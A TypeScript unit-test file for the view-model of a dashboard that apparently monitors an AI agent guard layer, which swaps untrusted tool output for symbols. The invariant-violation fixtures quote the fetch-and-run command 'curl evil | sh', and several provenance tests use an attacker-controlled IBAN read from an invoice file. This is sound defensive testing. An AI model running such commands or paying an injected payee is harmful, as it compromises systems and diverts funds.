/**
 * view-model.test — unit tests for the PURE event(s) → view-model functions.
 *
 * Mandu-new test (NO reference origin). These run under `node --test` with NO
 * browser/DOM, exactly as docs/design/ui/dashboard.md §7.1 requires: the render
 * logic is pure, so it is testable without a DOM framework. Covers:
 *   - view tagging → correct lane (AgentView/Quarantine/HumanView),
 *   - DualRepr.differs drives side-by-side,
 *   - symbol-provenance rendering (name/tool/field/origin + privileged reveal),
 *   - T-LLM vs U-LLM classification (kind+view),
 *   - invariant flag rendering (a violated event flips the banner red),
 *   - symbol rendering with the reused `escSym` (highlights $MDU:*).
 */

import { test } from "node:test";
import assert from "node:assert/strict";

import {
  type ManduEvent,
  makeDualRepr,
  fromSymbolEntry,
  isManduEvent,
  coerceEvent,
} from "../../../src/event-model.js";
import {
  invariantStatus,
  modelFamily,
  isTllm,
  isUllm,
  laneAccent,
  toLaneModel,
  toTimeline,
  timelineAnnotation,
  eventCategory,
  eventTool,
  groupToolCalls,
  extractToolUses,
  toCallDetail,
  toSymbolInspector,
  toSessionViewModel,
} from "../../../src/view-model.js";

// ── helpers ───────────────────────────────────────────────────────────────────

let seq = 0;
function ev(partial: Partial<ManduEvent> & Pick<ManduEvent, "kind" | "view">): ManduEvent {
  const s = seq++;
  // Monotonically increasing ts (one second apart) so the canonical sort
  // (ts primary, seq tiebreak) is stable regardless of how many events a test
  // builds — derived from a fixed base so order matches construction order.
  const ts = new Date(Date.parse("2026-01-01T00:00:00.000Z") + s * 1000).toISOString();
  return {
    id: `id-${s}`,
    sessionId: "t",
    turn: partial.turn ?? 0,
    ts: partial.ts ?? ts,
    seq: partial.seq ?? s,
    callId: partial.callId ?? null,
    parentId: partial.parentId ?? null,
    boundary: partial.boundary ?? "model_context",
    emitter: partial.emitter ?? "anthropic-proxy",
    input: partial.input ?? null,
    output: partial.output ?? null,
    policy: partial.policy,
    invariant: partial.invariant ?? { violatedInvariant: false },
    model: partial.model,
    ...partial,
  };
}

// ── view tagging → lanes ────────────────────────────────────────────────────

test("view tagging: each event lands in its view's lane", () => {
  const events = [
    ev({ kind: "tllm_call", view: "AgentView" }),
    ev({ kind: "ullm_call", view: "Quarantine" }),
    ev({ kind: "fs_action", view: "HumanView" }),
  ];
  const m = toLaneModel(events);
  assert.equal(m.byLane.AgentView.length, 1);
  assert.equal(m.byLane.Quarantine.length, 1);
  assert.equal(m.byLane.HumanView.length, 1);
  assert.equal(m.byLane.AgentView[0]!.kind, "tllm_call");
  assert.equal(m.byLane.Quarantine[0]!.kind, "ullm_call");
  assert.equal(m.byLane.HumanView[0]!.kind, "fs_action");
});

test("lane accent: AgentView green / Quarantine pink / HumanView cool", () => {
  assert.equal(laneAccent("AgentView"), "green");
  assert.equal(laneAccent("Quarantine"), "pink");
  assert.equal(laneAccent("HumanView"), "cool");
});

test("exec_action with HumanShell tags HumanView lane", () => {
  const e = ev({
    kind: "exec_action",
    view: "HumanView",
    boundary: "shell",
    emitter: "exec-supervisor",
    policy: { shell: "HumanShell" },
  });
  const m = toLaneModel([e]);
  assert.equal(m.byLane.HumanView.length, 1);
  assert.equal(toCallDetail(e).shell, "HumanShell");
});

// ── T-LLM vs U-LLM classification ──────────────────────────────────────────

test("T-LLM vs U-LLM is distinguished by kind+view", () => {
  const t = ev({ kind: "tllm_call", view: "AgentView" });
  const u = ev({ kind: "ullm_call", view: "Quarantine" });
  const other = ev({ kind: "tool_use", view: "AgentView" });
  assert.equal(modelFamily(t), "T-LLM");
  assert.equal(modelFamily(u), "U-LLM");
  assert.equal(modelFamily(other), null);
  assert.ok(isTllm(t) && !isUllm(t));
  assert.ok(isUllm(u) && !isTllm(u));
  // The lane card carries the family for color/lane keying (§4.4).
  assert.equal(toLaneModel([t, u]).byLane.AgentView[0]!.modelFamily, "T-LLM");
  assert.equal(toLaneModel([t, u]).byLane.Quarantine[0]!.modelFamily, "U-LLM");
});

// ── single timeline (toTimeline) — one annotated row per event ────────────────

test("timelineAnnotation maps each event to one of the four categories", () => {
  // T-LLM and U-LLM come from the model-call kind; everything else is its view.
  assert.equal(timelineAnnotation(ev({ kind: "tllm_call", view: "AgentView" })), "T-LLM");
  assert.equal(timelineAnnotation(ev({ kind: "ullm_call", view: "Quarantine" })), "U-LLM");
  assert.equal(timelineAnnotation(ev({ kind: "tool_result", view: "AgentView" })), "AgentView");
  assert.equal(timelineAnnotation(ev({ kind: "symbolize", view: "AgentView" })), "AgentView");
  assert.equal(timelineAnnotation(ev({ kind: "net_action", view: "HumanView" })), "HumanView");
  // A non-model event that still lands in Quarantine (re-symbolization) → U-LLM.
  assert.equal(timelineAnnotation(ev({ kind: "desymbolize", view: "Quarantine" })), "U-LLM");
});

test("toTimeline lists every event once, in chronological order", () => {
  const events = [
    ev({ kind: "tllm_call", view: "AgentView", turn: 0 }),
    ev({ kind: "tool_use", view: "AgentView", turn: 0 }),
    ev({ kind: "fs_action", view: "HumanView", turn: 1 }),
  ];
  const rows = toTimeline(events);
  assert.equal(rows.length, 3);
  assert.deepEqual(rows.map((r) => r.kind), ["tllm_call", "tool_use", "fs_action"]);
});

test("a model turn LEADS the tool_use it produced (tllm_call finalized at stream-end)", () => {
  // The proxy finalizes the `tllm_call` only at stream-END, so it lands with a
  // LATER ts/seq than the `tool_use` block it produced in that same turn. The
  // canonical order must still read reason→decision: the model call leads its
  // tool call(s). The PRIOR tool's result (the turn's INPUT) stays ahead of both.
  const rows = toTimeline([
    ev({ kind: "tool_result", view: "AgentView", turn: 2, callId: "prev" }), // input to the turn
    ev({ kind: "tool_use", view: "AgentView", turn: 2, callId: "new" }), // emitted before the tllm_call
    ev({ kind: "tllm_call", view: "AgentView", turn: 2 }), // finalized last → latest ts/seq
  ]);
  assert.deepEqual(rows.map((r) => r.kind), ["tool_result", "tllm_call", "tool_use"]);
});

test("leading a model call over its tool_use does NOT pull it across a turn boundary", () => {
  // A tool_use from a DIFFERENT (earlier) turn must not be reordered under the
  // next turn's model call — only same-turn tool_use runs are pulled.
  const rows = toTimeline([
    ev({ kind: "tool_use", view: "AgentView", turn: 1, callId: "a" }),
    ev({ kind: "tllm_call", view: "AgentView", turn: 2 }),
  ]);
  assert.deepEqual(rows.map((r) => r.kind), ["tool_use", "tllm_call"]);
});

test("toTimeline annotates rows and keeps the lane card's accent + family", () => {
  const rows = toTimeline([
    ev({ kind: "ullm_call", view: "Quarantine" }),
    ev({ kind: "net_action", view: "HumanView" }),
    ev({ kind: "tllm_call", view: "AgentView" }),
  ]);
  assert.equal(rows[0]!.annotation, "U-LLM");
  assert.equal(rows[0]!.accent, "pink");
  assert.equal(rows[1]!.annotation, "HumanView");
  assert.equal(rows[1]!.accent, "cool");
  assert.equal(rows[2]!.annotation, "T-LLM");
  assert.equal(rows[2]!.accent, "green");
  // The card metadata (title/badge/modelFamily) is carried through unchanged.
  assert.equal(rows[2]!.modelFamily, "T-LLM");
});

test("a model call's title is just its family (T-LLM/U-LLM), dropping the redundant kind", () => {
  // tllm_call/T-LLM are always shown together, so only the one readable label is
  // kept: the title is "T-LLM" (not "tllm_call · T-LLM"). Non-model kinds keep
  // their kind string.
  const rows = toTimeline([
    ev({ kind: "tllm_call", view: "AgentView", turn: 0 }),
    ev({ kind: "ullm_call", view: "Quarantine", turn: 1 }),
    ev({ kind: "tool_use", view: "AgentView", turn: 2 }),
  ]);
  const byKind = Object.fromEntries(rows.map((r) => [r.kind, r.title]));
  assert.equal(byKind["tllm_call"], "T-LLM");
  assert.equal(byKind["ullm_call"], "U-LLM");
  assert.match(byKind["tool_use"] as string, /^tool_use/);
});

test("toTimeline marks the first row of each turn (for the turn divider)", () => {
  const rows = toTimeline([
    ev({ kind: "tllm_call", view: "AgentView", turn: 0 }),
    ev({ kind: "tool_use", view: "AgentView", turn: 0 }),
    ev({ kind: "tllm_call", view: "AgentView", turn: 1 }),
  ]);
  assert.deepEqual(rows.map((r) => r.firstInTurn), [true, false, true]);
});

// ── DualRepr.differs drives side-by-side ──────────────────────────────────────

test("makeDualRepr computes differs from symbolized !== original", () => {
  const same = makeDualRepr("hello", "hello");
  assert.equal(same.differs, false);
  const diff = makeDualRepr("$MDU:read[9c].iban", "attacker@evil");
  assert.equal(diff.differs, true);
  // original=null is collapsed (no side-by-side comparison on this event).
  const nullOrig = makeDualRepr("$MDU:read[9c].iban", null);
  assert.equal(nullOrig.differs, false);
});

test("toCallDetail: differs → side-by-side; identical → collapsed", () => {
  const symbolized = "Invoice from $MDU:read[9c].vendor";
  const original = "Invoice from acme.example";
  const e = ev({
    kind: "tool_result",
    view: "AgentView",
    input: makeDualRepr(symbolized, original, [
      fromSymbolEntry("$MDU:read[9c].vendor", {
        value: "acme.example",
        tool: "read",
        field: "vendor",
        origin: "file:invoice.txt",
      }),
    ]),
    output: makeDualRepr("ok", "ok"),
  });
  const d = toCallDetail(e);
  assert.equal(d.input.present, true);
  assert.equal(d.input.sideBySide, true, "differing input renders side-by-side");
  assert.equal(d.input.symbolized, symbolized);
  assert.equal(d.input.original, original);
  assert.equal(d.output.present, true);
  assert.equal(d.output.sideBySide, false, "identical output collapses");
});

test("toCallDetail: original=null renders as a present-but-collapsed panel (revealed on demand)", () => {
  const e = ev({
    kind: "tllm_call",
    view: "AgentView",
    input: makeDualRepr("uses $MDU:read[9c].iban", null),
  });
  const d = toCallDetail(e);
  assert.equal(d.input.present, true);
  assert.equal(d.input.original, null, "null original → UI shows '(revealed on demand)'");
  assert.equal(d.input.sideBySide, false);
});

// ── symbol-provenance ──────────────────────────────────────────────────────

test("fromSymbolEntry projects arbiter SymbolEntry → SymbolRef (snake→camel)", () => {
  const ref = fromSymbolEntry("$MDU:read[9c].iban", {
    value: "attacker@evil",
    tool: "read",
    field: "iban",
    origin: "file:invoice.txt",
    derived_from: "$MDU:read[9c]",
    line_range: "0:29",
  });
  assert.equal(ref.name, "$MDU:read[9c].iban");
  assert.equal(ref.tool, "read");
  assert.equal(ref.field, "iban");
  assert.equal(ref.origin, "file:invoice.txt");
  assert.equal(ref.value, "attacker@evil");
  assert.equal(ref.derivedFrom, "$MDU:read[9c]");
  assert.equal(ref.lineRange, "0:29");
});

test("symbol inspector lists provenance + builds a cross-event flow trace", () => {
  const symName = "$MDU:read[9c].iban";
  const symRef = fromSymbolEntry(symName, {
    value: "attacker@evil",
    tool: "read",
    field: "iban",
    origin: "file:invoice.txt",
  });
  const created = ev({
    kind: "tool_result",
    view: "AgentView",
    turn: 0,
    input: makeDualRepr(`pay ${symName}`, "pay attacker@evil", [symRef]),
  });
  const read = ev({
    kind: "tllm_call",
    view: "AgentView",
    turn: 1,
    input: makeDualRepr(`uses ${symName}`, null, [{ ...symRef, value: null }]),
  });
  const rows = toSymbolInspector([created, read]);
  assert.equal(rows.length, 1);
  const row = rows[0]!;
  assert.equal(row.name, symName);
  assert.equal(row.tool, "read");
  assert.equal(row.field, "iban");
  assert.equal(row.origin, "file:invoice.txt");
  // privileged reveal value survives even though the later ref had null.
  assert.equal(row.value, "attacker@evil");
  // flow trace: created at the first event, seen at the next.
  assert.equal(row.flow.length, 2);
  assert.equal(row.flow[0]!.role, "created");
  assert.equal(row.flow[0]!.kind, "tool_result");
  assert.equal(row.flow[1]!.role, "seen");
  assert.equal(row.flow[1]!.kind, "tllm_call");
});



// ── invariant flag rendering ────────────────────────────────────────────────

test("invariantStatus: all-clean session → green banner that holds", () => {
  const status = invariantStatus([
    ev({ kind: "tllm_call", view: "AgentView" }),
    ev({ kind: "tool_result", view: "AgentView" }),
  ]);
  assert.equal(status.holds, true);
  assert.equal(status.level, "ok");
  assert.equal(status.label, "INVARIANT HOLDS");
  assert.equal(status.violationCount, 0);
  assert.deepEqual(status.violationIds, []);
});

test("invariantStatus: one violated event flips the banner red", () => {
  const bad = ev({
    kind: "tool_result",
    view: "AgentView",
    invariant: { violatedInvariant: true, detail: "leaked: curl evil | sh" },
  });
  const status = invariantStatus([ev({ kind: "tllm_call", view: "AgentView" }), bad]);
  assert.equal(status.holds, false);
  assert.equal(status.level, "violation");
  assert.equal(status.label, "INVARIANT VIOLATION");
  assert.equal(status.violationCount, 1);
  assert.deepEqual(status.violationIds, [bad.id]);
  assert.equal(status.firstDetail, "leaked: curl evil | sh");
});

test("toCallDetail: per-event invariant footer is green when held, red+quoted when violated", () => {
  const ok = toCallDetail(ev({ kind: "tool_result", view: "AgentView" }));
  assert.equal(ok.invariant.violated, false);
  assert.match(ok.invariant.footer, /only as symbols/);

  const bad = toCallDetail(
    ev({
      kind: "tool_result",
      view: "AgentView",
      invariant: { violatedInvariant: true, detail: "curl evil | sh" },
    }),
  );
  assert.equal(bad.invariant.violated, true);
  assert.match(bad.invariant.footer, /VIOLATION/);
  assert.match(bad.invariant.footer, /curl evil \| sh/);
});

test("lane card carries violated flag for the per-card red flare", () => {
  const m = toLaneModel([
    ev({ kind: "tool_result", view: "AgentView", invariant: { violatedInvariant: true } }),
  ]);
  assert.equal(m.cards[0]!.violated, true);
});

test("toCallDetail passes a model call's fullInput through onto the CallDetail", () => {
  const fullInput = {
    blocks: [
      { role: "system" as const, source: "mandu" as const, text: "[mandu:handling-prompt]\nsymbols are opaque" },
      { role: "system" as const, source: "agent" as const, text: "You are Claude Code." },
      { role: "user" as const, source: "conversation" as const, text: "Summarize notes.md" },
      { role: "tool_result" as const, source: "conversation" as const, label: "tool_result tu1", text: "$MDU:Read[a1b2]" },
    ],
  };
  const d = toCallDetail(ev({ kind: "tllm_call", view: "AgentView", fullInput }));
  assert.ok(d.fullInput, "CallDetail carries fullInput");
  assert.equal(d.fullInput!.blocks.length, 4);
  assert.equal(d.fullInput!.blocks[0]!.source, "mandu");
  assert.equal(d.fullInput!.blocks[0]!.text, "[mandu:handling-prompt]\nsymbols are opaque");
});

test("toCallDetail leaves fullInput null when the event has none (older events / other kinds)", () => {
  const d = toCallDetail(ev({ kind: "tool_result", view: "AgentView" }));
  assert.equal(d.fullInput, null, "no fullInput → null so the UI shows no 'Show full input' button");
});

// ── causal links + turn rails ────────────────────────────────────────────────

test("toLaneModel builds causal links via parentId/callId and turn rails", () => {
  const root = ev({ kind: "tllm_call", view: "AgentView", turn: 0, id: "root" });
  const use = ev({ kind: "tool_use", view: "AgentView", turn: 0, id: "use", callId: "c", parentId: "root" });
  const result = ev({ kind: "tool_result", view: "AgentView", turn: 0, id: "res", callId: "c" });
  const m = toLaneModel([root, use, result]);
  // parentId link root→use, callId link use→res.
  assert.ok(m.links.some((l) => l.fromId === "root" && l.toId === "use" && l.via === "parentId"));
  assert.ok(m.links.some((l) => l.fromId === "use" && l.toId === "res" && l.via === "callId"));
  assert.equal(m.turns.length, 1);
  assert.equal(m.turns[0]!.turn, 0);
  assert.equal(m.turns[0]!.cardIds.length, 3);
});

// ── schema validation ────────────────────────────────────────────────────────

test("eventCategory maps each kind to its actor/stage (AGENT/GUARD/OS)", () => {
  for (const k of ["tllm_call", "ullm_call", "tool_use"] as const) assert.equal(eventCategory(k), "AGENT");
  for (const k of ["classify", "symbolize", "desymbolize", "tool_result", "egress_request", "egress_decision"] as const) assert.equal(eventCategory(k), "GUARD");
  for (const k of ["fs_action", "net_action", "exec_action"] as const) assert.equal(eventCategory(k), "OS");
});

test("toTimeline rows carry the actor/stage category (a symbolize reads as GUARD, not AGENT)", () => {
  const evs = [
    ev({ kind: "symbolize", view: "AgentView" }),
    ev({ kind: "tllm_call", view: "AgentView" }),
    ev({ kind: "net_action", view: "HumanView" }),
  ];
  assert.deepEqual(toTimeline(evs).map((r) => r.category), ["GUARD", "AGENT", "OS"]);
});

test("eventTool derives the tool name from the minted symbol or the tool_use input", () => {
  const symRef = fromSymbolEntry("$MDU:Read[ab]", { value: "x", tool: "Read", field: null, origin: null });
  const symEv = ev({ kind: "symbolize", view: "AgentView", output: makeDualRepr("$MDU:Read[ab]", null, [symRef]) });
  assert.equal(eventTool(symEv), "Read");
  const tuEv = ev({ kind: "tool_use", view: "AgentView", input: makeDualRepr('Bash({"command":"ls"})', null, []) });
  assert.equal(eventTool(tuEv), "Bash");
  // G3: a tool_use carries structured refs for its ARGUMENT symbols — the
  // called tool's name must still win (an inspect call over a Bash-born
  // symbol is not a Bash card; live: claude-e2e inspect-extract).
  const mcpEv = ev({
    kind: "tool_use", view: "AgentView",
    input: makeDualRepr(
      'mcp__mandu-inspect__inspect_symbol({"symbol":"$MDU:Bash[a2]"})',
      null,
      [{ name: "$MDU:Bash[a2]", tool: "Bash", field: null, origin: null, value: null }],
    ),
  });
  assert.equal(eventTool(mcpEv), "mcp__mandu-inspect__inspect_symbol", "arg refs must not rename the card");
  assert.equal(eventTool(ev({ kind: "tllm_call", view: "AgentView" })), null, "a model turn has no tool");
});

test("groupToolCalls merges callId-correlated rows into one tool call; model turns stay standalone", () => {
  const ref = () => fromSymbolEntry("$MDU:Read[ab]", { value: "raw", tool: "Read", field: null, origin: null });
  const evs = [
    ev({ kind: "tllm_call", view: "AgentView" }),
    ev({ kind: "tool_use", view: "AgentView", callId: "t1", input: makeDualRepr('Read({"file_path":"/x"})', null, []) }),
    ev({ kind: "symbolize", view: "AgentView", callId: "t1", output: makeDualRepr("$MDU:Read[ab]", "raw", [ref()]) }),
    ev({ kind: "tool_result", view: "AgentView", callId: "t1", output: makeDualRepr("$MDU:Read[ab]", "raw", [ref()]) }),
    ev({ kind: "tllm_call", view: "AgentView" }),
  ];
  const units = groupToolCalls(toTimeline(evs), extractToolUses(evs));
  assert.deepEqual(units.map((u) => u.unit), ["event", "toolcall", "event"]);
  const g = units[1]!;
  assert.equal(g.unit, "toolcall");
  if (g.unit === "toolcall") {
    assert.equal(g.tool, "Read", "tool name from the symbol/tool_use");
    assert.equal(g.input, '{"file_path":"/x"}', "input args reconstructed from the tool_use");
    assert.ok(g.output, "tool_result → output");
    assert.equal(g.outputGuard.length, 1, "symbolize → output-guard");
    assert.equal(g.inputGuard.length, 0);
    assert.equal(g.rows.length, 3, "tool_use + symbolize + tool_result");
  }
});

test("groupToolCalls sets the group trust from its result classification (drives the green/pink colour)", () => {
  // A tool call is coloured by the TRUST of its result: trusted → green,
  // untrusted → pink. The group carries that trust so the sidebar + main frame
  // colour consistently (no flat purple).
  const ref = () => fromSymbolEntry("$MDU:Read[ab]", { value: "raw", tool: "Read", field: null, origin: null });
  const untrusted = [
    ev({ kind: "tool_use", view: "AgentView", callId: "t1", input: makeDualRepr('Read({"file_path":"/x"})', null, []) }),
    ev({ kind: "symbolize", view: "AgentView", callId: "t1", policy: { trust: "UNTRUSTED" }, output: makeDualRepr("$MDU:Read[ab]", "raw", [ref()]) }),
    ev({ kind: "tool_result", view: "AgentView", callId: "t1", policy: { trust: "UNTRUSTED" }, output: makeDualRepr("$MDU:Read[ab]", "raw", [ref()]) }),
  ];
  const ug = groupToolCalls(toTimeline(untrusted), extractToolUses(untrusted))[0]!;
  assert.equal(ug.unit, "toolcall");
  if (ug.unit === "toolcall") assert.equal(ug.trust, "UNTRUSTED", "untrusted result → group trust UNTRUSTED");

  const trusted = [
    ev({ kind: "tool_use", view: "AgentView", callId: "t2", input: makeDualRepr('Write({"file_path":"/y"})', null, []) }),
    ev({ kind: "tool_result", view: "AgentView", callId: "t2", policy: { trust: "TRUSTED" }, output: makeDualRepr("File created.", null, []) }),
  ];
  const tg = groupToolCalls(toTimeline(trusted), extractToolUses(trusted))[0]!;
  if (tg.unit === "toolcall") assert.equal(tg.trust, "TRUSTED", "trusted result → group trust TRUSTED");
});

test("extractToolUses recovers each tool's name + args from a tllm_call transcript (no tool_use event)", () => {
  const transcript = [
    "▸ assistant", '→ WebFetch({"url":"https://x"})',
    "▸ user", "[tool_result wf]", "$MDU:WebFetch[de04]",
    "▸ assistant", '→ Write({"file_path":"setup.md"})',
    "▸ user", "[tool_result wr]", "File created.",
  ].join("\n");
  const m = extractToolUses([ev({ kind: "tllm_call", view: "AgentView", input: makeDualRepr(transcript, null, []) })]);
  // Note the Write call carries NO symbol, so its name is ONLY recoverable here.
  assert.deepEqual(m.get("wf"), { tool: "WebFetch", input: '{"url":"https://x"}' });
  assert.deepEqual(m.get("wr"), { tool: "Write", input: '{"file_path":"setup.md"}' });
});

test("isManduEvent accepts a well-formed event and rejects garbage", () => {
  assert.equal(isManduEvent(ev({ kind: "tllm_call", view: "AgentView" })), true);
  assert.equal(isManduEvent({ id: "x" }), false);
  assert.equal(isManduEvent(null), false);
  assert.equal(isManduEvent("nope"), false);
});

test("coerceEvent repairs an OS-interceptor trace (epoch-ms ts, no invariant) so it renders", () => {
  // The exact shape the net-proxy used to emit (and still on-disk for eg_* sessions):
  // a numeric epoch-ms ts and NO invariant — which isManduEvent rejects, blanking
  // the session. coerceEvent repairs it instead.
  const raw = {
    kind: "net_action", sessionId: "eg_x", id: "eg_x:1:2",
    ts: 1781765326070, view: "AgentView",
    action: "tunneled", method: "CONNECT", destination: "api.example.com:443", seq: 1,
  };
  assert.equal(isManduEvent(raw), false, "the raw net_action fails the strict guard");
  const e = coerceEvent(raw);
  assert.ok(e, "coerceEvent recovers it");
  assert.equal(typeof e!.ts, "string");
  assert.match(e!.ts, /^\d{4}-\d\d-\d\dT/, "epoch-ms ts → ISO 8601");
  assert.equal(e!.invariant.violatedInvariant, false, "missing invariant → non-violated");
  assert.equal(e!.boundary, "network");
  assert.equal(e!.emitter, "net-supervisor");
  assert.equal(e!.turn, 0);
  assert.equal(e!.input, null);
  // …and it flows through the view-model without throwing, as a titled card.
  const vm = toSessionViewModel("eg_x", [e!]);
  assert.equal(vm.timeline.length, 1);
  assert.equal(vm.invariant.holds, true);
  assert.match(vm.timeline[0]!.title, /net_action · tunneled api\.example\.com:443/);
});

test("coerceEvent passes a canonical event through and drops identity-less garbage", () => {
  const good = ev({ kind: "tllm_call", view: "AgentView" });
  const c = coerceEvent(good);
  assert.ok(c);
  assert.equal(c!.id, good.id);
  assert.equal(typeof c!.ts, "string");
  assert.equal(coerceEvent({ kind: "net_action", view: "AgentView", ts: 1 }), null, "no id/sessionId → unrecoverable");
  assert.equal(coerceEvent({ id: "x", sessionId: "s", kind: "net_action", view: "AgentView" }), null, "no ts → unrecoverable");
  assert.equal(coerceEvent(null), null);
  assert.equal(coerceEvent("nope"), null);
});

// ── full session bundle ──────────────────────────────────────────────────────

test("toSessionViewModel assembles all panels + maxTurn", () => {
  const vm = toSessionViewModel("s", [
    ev({ kind: "tllm_call", view: "AgentView", turn: 0 }),
    ev({ kind: "ullm_call", view: "Quarantine", turn: 3 }),
  ]);
  assert.equal(vm.sessionId, "s");
  assert.equal(vm.invariant.holds, true);
  assert.equal(vm.lanes.cards.length, 2);
  // The single timeline carries one annotated row per event.
  assert.equal(vm.timeline.length, 2);
  assert.deepEqual(vm.timeline.map((r) => r.annotation), ["T-LLM", "U-LLM"]);
  assert.equal(vm.maxTurn, 3);
});
